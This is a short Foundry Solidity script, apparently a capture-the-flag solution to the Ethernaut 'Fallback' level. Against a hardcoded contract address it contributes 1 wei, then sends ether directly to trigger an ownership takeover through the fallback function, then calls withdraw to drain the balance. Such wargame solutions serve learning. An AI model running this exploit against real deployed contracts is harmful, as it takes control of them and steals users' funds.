// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FallbackF} from "../src/FallbackF.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {

    FallbackF public fallbackContract = FallbackF(payable(0x739586e150cBaEd0CB8128dD232c0E2f01757775));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        fallbackContract.contribute{value:1 wei}();
        address(fallbackContract).call{value:1 wei}("");
        fallbackContract.withdraw();
    }
}
